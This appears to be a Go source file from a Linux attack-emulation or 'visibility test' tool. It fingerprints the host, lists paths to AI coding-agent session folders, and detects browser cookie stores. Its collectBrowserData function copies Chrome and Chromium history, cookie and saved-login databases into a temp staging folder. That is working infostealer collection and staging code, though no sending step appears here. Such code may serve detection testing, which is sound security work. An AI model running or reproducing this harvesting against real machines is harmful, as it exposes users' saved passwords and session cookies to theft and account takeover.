//go:build linux

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
)

// getHomeDir returns the home directory for the current platform
func getHomeDir() string {
	if home := os.Getenv("HOME"); home != "" {
		return home
	}
	return "/root"
}

// getAgentDirectories returns agent-specific paths for Linux
func getAgentDirectories() map[string]string {
	return map[string]string{
		"Claude": ".claude/projects",
		"Kiro":   ".kiro/sessions/cli",
		// Cowork uses Windows Store app - not available on Linux
	}
}

// collectSystemInfo gathers system information for Linux
func collectSystemInfo() SystemInfo {
	info := SystemInfo{}

	// Computer name
	if name, err := os.Hostname(); err == nil {
		info.ComputerName = name
	}

	// Username
	if user := os.Getenv("USER"); user != "" {
		info.Username = user
	} else {
		info.Username = "unknown"
	}

	// OS Name from /etc/os-release
	if data, err := os.ReadFile("/etc/os-release"); err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "PRETTY_NAME=") {
				info.OSName = strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), `"`)
				break
			}
		}
	}
	if info.OSName == "" {
		info.OSName = "Linux"
	}

	// Kernel version
	if out, err := exec.Command("uname", "-r").Output(); err == nil {
		info.OSVersion = strings.TrimSpace(string(out))
	}

	// CPU Name from /proc/cpuinfo
	if data, err := os.ReadFile("/proc/cpuinfo"); err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "model name") {
				parts := strings.SplitN(line, ":", 2)
				if len(parts) == 2 {
					info.CPUName = strings.TrimSpace(parts[1])
					break
				}
			}
		}
	}
	if info.CPUName == "" {
		info.CPUName = "Unknown CPU"
	}

	// Memory from /proc/meminfo
	if data, err := os.ReadFile("/proc/meminfo"); err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "MemTotal:") {
				fields := strings.Fields(line)
				if len(fields) >= 2 {
					if kb, err := strconv.ParseFloat(fields[1], 64); err == nil {
						memGB := kb / (1024 * 1024)
						info.TotalMemory = fmt.Sprintf("%.2f GB", memGB)
					}
				}
				break
			}
		}
	}
	if info.TotalMemory == "" {
		info.TotalMemory = "Unknown"
	}

	// System uptime from /proc/uptime
	if data, err := os.ReadFile("/proc/uptime"); err == nil {
		fields := strings.Fields(string(data))
		if len(fields) >= 1 {
			if uptimeSec, err := strconv.ParseFloat(fields[0], 64); err == nil {
				sec := int64(uptimeSec)
				days := sec / 86400
				hours := (sec % 86400) / 3600
				mins := (sec % 3600) / 60
				info.SystemUptime = fmt.Sprintf("%dd %dh %dm", days, hours, mins)
			}
		}
	}
	if info.SystemUptime == "" {
		info.SystemUptime = "Unknown"
	}

	// Browser cookies detection
	info.BrowserCookies = detectBrowserCookies()

	return info
}

func detectBrowserCookies() string {
	home := getHomeDir()
	browsers := []string{}

	paths := map[string]string{
		"Chrome":  filepath.Join(home, ".config/google-chrome/Default/Cookies"),
		"Chromium": filepath.Join(home, ".config/chromium/Default/Cookies"),
		"Firefox": filepath.Join(home, ".mozilla/firefox"),
	}

	for browser, path := range paths {
		if _, err := os.Stat(path); err == nil {
			browsers = append(browsers, browser)
		}
	}

	if len(browsers) > 0 {
		return "Detected: " + strings.Join(browsers, ", ")
	}
	return "None detected"
}

func collectBrowserData() {
	home := getHomeDir()
	tempDir := os.TempDir()
	stagingDir := filepath.Join(tempDir, "logs")

	os.MkdirAll(stagingDir, 0755)

	fmt.Printf("%s[INFO]%s Collecting browser data for visibility test...\n", ColorGreen, ColorReset)

	files := map[string]string{
		filepath.Join(home, ".config/google-chrome/Default/History"):       "chrome_history.db",
		filepath.Join(home, ".config/google-chrome/Default/Cookies"):       "chrome_cookies.db",
		filepath.Join(home, ".config/google-chrome/Default/Login Data"):    "chrome_logins.db",
		filepath.Join(home, ".config/chromium/Default/History"):            "chromium_history.db",
		filepath.Join(home, ".config/chromium/Default/Cookies"):            "chromium_cookies.db",
	}

	collected := 0
	for src, dst := range files {
		if err := copyFile(src, filepath.Join(stagingDir, dst)); err == nil {
			fmt.Printf("%s[+]%s Collected: %s\n", ColorGreen, ColorReset, dst)
			collected++
		}
	}

	if collected > 0 {
		fmt.Printf("%s[SUCCESS]%s Collected %d browser data files\n", ColorGreen, ColorReset, collected)
	} else {
		fmt.Printf("%s[WARN]%s No browser data files collected\n", ColorYellow, ColorReset)
	}
}
